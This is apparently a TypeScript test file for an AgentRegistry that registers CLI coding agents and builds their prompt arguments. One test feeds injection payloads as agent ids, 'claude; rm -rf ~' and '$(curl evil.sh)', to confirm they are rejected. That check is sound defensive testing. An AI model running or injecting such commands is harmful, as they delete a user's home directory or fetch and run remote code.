import { test } from 'node:test';
import assert from 'node:assert/strict';
import { AgentRegistry } from './AgentRegistry.js';

test('builtins are registered', () => {
  const r = new AgentRegistry();
  assert.equal(r.isRegistered('claude', []), true);
  assert.equal(r.isRegistered('gemini', []), true);
  assert.equal(r.isRegistered('codex', []), true);
  assert.equal(r.isRegistered('shell', []), true);
});

test('the plain shell runs the login shell, takes no prompt, and is not detected as an agent', () => {
  const r = new AgentRegistry();
  const shell = r.getById('shell', [])!;
  assert.equal(shell.command, process.env.SHELL || '/bin/zsh');
  assert.equal(promptArgs(shell, 'hi'), null);
  assert.ok(!r.detectInstalled().some((s) => s.agent.id === 'shell'));
});

test('custom agents are registered', () => {
  const r = new AgentRegistry();
  const custom = [{ id: 'aider', name: 'Aider', command: 'aider', builtin: false }];
  assert.equal(r.isRegistered('aider', custom), true);
});

test('unregistered / injection payloads are rejected', () => {
  const r = new AgentRegistry();
  assert.equal(r.isRegistered('claude; rm -rf ~', []), false);
  assert.equal(r.isRegistered('$(curl evil.sh)', []), false);
  assert.equal(r.isRegistered('', []), false);
});

import { promptArgs, AgentRegistry as Reg } from './AgentRegistry.js';

test('promptArgs: built-ins and custom agents', () => {
  const r = new Reg();
  const get = (id: string) => r.getById(id, [])!;
  assert.deepEqual(promptArgs(get('claude'), 'hi'), ['hi']);
  assert.deepEqual(promptArgs(get('codex'), 'hi'), ['hi']);
  assert.deepEqual(promptArgs(get('gemini'), 'hi'), ['-i', 'hi']);
  const custom = { id: 'x', name: 'X', command: 'x', builtin: false };
  assert.equal(promptArgs(custom, 'hi'), null);
  assert.deepEqual(promptArgs({ ...custom, promptFlag: '--prompt' }, 'hi'), ['--prompt', 'hi']);
});
